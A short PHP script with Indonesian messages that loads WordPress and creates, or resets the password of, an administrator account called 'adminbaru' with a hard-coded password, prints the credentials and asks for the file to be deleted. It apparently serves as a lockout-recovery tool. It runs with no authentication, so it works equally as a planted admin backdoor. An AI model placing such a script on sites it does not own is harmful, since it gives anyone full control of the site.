<?php
$new_username = 'adminbaru';
$new_password = 'PasswordKuat123!';
$new_email    = 'admin@example.com';

$wp_load = dirname(__DIR__, 3) . '/wp-load.php';
if (!file_exists($wp_load)) {
    die("wp-load.php tidak ditemukan.");
}
require_once($wp_load);

if (username_exists($new_username)) {
    $user = get_user_by('login', $new_username);
    wp_set_password($new_password, $user->ID);
    echo "User $new_username sudah ada, password direset.<br>";
} else {
    $user_id = wp_create_user($new_username, $new_password, $new_email);
    if (is_wp_error($user_id)) die("Gagal: " . $user_id->get_error_message());
    echo "User $new_username berhasil dibuat (ID: $user_id).<br>";
}
$user = new WP_User($user_id ?? get_user_by('login', $new_username)->ID);
$user->set_role('administrator');

echo "Role: administrator<br>";
echo "Login: $new_username / $new_password<br>";
echo "HAPUS file ini sekarang juga!";
